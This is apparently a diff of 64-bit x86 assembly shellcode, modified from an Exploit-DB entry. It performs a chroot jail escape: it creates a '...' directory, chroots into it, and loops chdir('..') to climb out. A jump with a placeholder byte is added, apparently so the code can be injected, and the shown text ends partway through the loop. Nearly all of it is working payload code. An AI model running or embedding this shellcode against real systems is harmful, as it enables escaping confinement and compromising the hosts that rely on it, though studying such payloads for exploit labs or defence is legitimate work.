@@ -2,28 +2,31 @@ BITS 64
 
 ;https://www.exploit-db.com/shellcodes/13577, modified for 64 bit
 ; mkdir("...", 0700);
-push 83
-pop rax, ;mkdir syscall
-push byte 0x2e
-push word 0x2e2e
-mov rdi, rsp
-mov rsi, 0700o
-syscall
+jmp x 
+;PLACE HOLDER, we need to add a byte manually here
+x:
+  push 83
+  pop rax, ;mkdir syscall
+  push byte 0x2e
+  push word 0x2e2e
+  mov rdi, rsp
+  mov rsi, 0700o
+  syscall
 
-; chroot("...");
-mov rax, 161
-mov rdi, rsp
-syscall 
+  ; chroot("...");
+  mov rax, 161
+  mov rdi, rsp
+  syscall 
 
-; for (i = 100; i > 0; i--)
-; {
-; 	chdir("..");
-; }
-pop dx ; addr ".."
-xor rcx, rcx
-push rcx
-push dx
-mov cl, 100
+  ; for (i = 100; i > 0; i--)
+  ; {
+  ; 	chdir("..");
+  ; }
+  pop dx ; addr ".."
+  xor rcx, rcx
+  push rcx
+  push dx
+  mov cl, 100
 up:
 	mov rax, 80
 	mov rdi, rsp
